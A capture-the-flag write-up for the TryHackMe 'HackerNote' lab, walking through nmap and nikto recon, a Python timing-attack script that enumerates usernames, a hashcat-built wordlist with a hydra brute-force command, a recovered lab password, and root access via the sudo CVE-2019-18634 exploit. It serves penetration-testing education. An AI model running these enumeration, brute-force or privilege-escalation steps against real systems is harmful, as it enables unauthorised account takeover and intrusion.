
## Room : HackerNote
## Description: This room teaches the basics of webapp pentesting.
### Author: gr33nm0nk2802

[link](https://tryhackme.com/room/hackernote)

```
export IP=10.10.254.162
```

# Task 1: (Initial Reconnaissance)

```(nmap scan)
	
	nmap -sS -vv -sV -Pn $IP
	
	PORT     STATE SERVICE REASON         VERSION
	22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	80/tcp   open  http    syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
	8080/tcp open  http    syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
So, we have 3 ports open and Golang is being used in the backend. That's the answer for the first two questions.

# Task 2: (Investigation)

In this section we try to analyse the web service and look for the possible entrypoints. Also we look for the login, signup and forgot password page and try to login as an unauthenticated user to find any flaws that may reside in the application by testing it manually.


```(nikto scan)
	
	nikto -h http://$IP

	- Nikto v2.1.6
	---------------------------------------------------------------------------
	+ Target IP:          10.10.254.162
	+ Target Hostname:    10.10.254.162
	+ Target Port:        80
	+ Start Time:         2020-07-15 19:18:13 (GMT5.5)
	---------------------------------------------------------------------------
	+ Server: No banner retrieved
	+ The anti-clickjacking X-Frame-Options header is not present.
	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
	+ No CGI Directories found (use '-C all' to force check all possible dirs)
	+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.

```

Looking at the login.js file we find something interesting, 

Under the  login() function
```
	const response = await postData("/api/user/login", { username: username, password: password });
```

Under the forgotPassword() function
```
	const response = await getData("/api/user/passwordhint/" + username)
```

Under the createUser() function
```
	const response = await postData("/api/user/create", user);
```

These api endpoints look interesting.

We will try to bruteforce the (/api/user/login)

# Task 3: (Exploit)

Using the timing attack flaw as described in the room we are able to exploit and find out the username to be james

For the names use [names wordlist](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt) and convert the names to lowercase.

Timing Attack:

```(python)
	
	#!/usr/bin/env python

	import requests
	import time

	URL="http://10.10.254.162/api/user/login"


	def doLogin(username):
		creds = {"username":username,"password":"invalidPasswordxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!"}
		response = requests.post(URL,json=creds)


	with open('names.txt','r') as f:
		
		data=f.read().rstrip().split()
		for user in data:
			users=user.rstrip()
			
			startTime = time.time()
		 	doLogin(users)
		 	endTime = time.time()
			print(users+" has login time of "+str(endTime-startTime))
```

### Reason for the exploit working is explained in the room.

```
def login(username, password):
    if username in users: ##If it's a valid username
        login_status = check_password(password) ##This takes a noticeable amount of time
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```
Here we can clearly see that if the username is correct then the backend does an extra check for the password which takes considerable time.

We will use a pre written and tested script for the attack part.
Here is the [link](https://github.com/NinjaJc01/hackerNoteExploits)


# Task 4: (Password Attack)

Next we createa custom wordlist as described in the room using [hashcat]( https://github.com/hashcat/hashcat-utils/releases)

Download the wordlist.zip folder containing colors.txt and numbers.txt

Next we create our custom wordlist using hashcat.

```(custom wordlist)
    ./combinator.bin colors.txt numbers.txt > wordlist.txt
``` 

Next we crack the password using hydra.

```(hydra bruteforce)
	hydra -l james -P wordlist.txt $IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password""
```

Now we have the password for the user james:blue7

Using this data when we login and view the notes page we get the ssh password of james.
Lets ssh into the machine now.

After ssh we can find the user flag there.

# Task 5: (Esclate Privileges)

Next for privilege esclation we try to run any command as sudo to check if this works.

When we enter 
```
sudo -l
```

We are prompted with a password but when we run the password we see asteriks. This is a recent vulnerability. This abnormal setting is known as pwdfeedback. This comes in CVE-2019-18634

Exploit: https://github.com/saleemrashid/sudo-cve-2019-18634

First we compile the exploit on our local machine. Then we use scp to copy the files from our host to server.

```(copying files to the server)
   scp ./exploit james@$IP:/home/james
```

After copying this exploit we simply execute it and bingo we are root.

Thanks to my teammate p4nth3r for the last part. I was struck at scp. Do note use the scp command on the host where you compiled the program and dont forget to export your IP to the variable if you intend to use the exactly same command. 
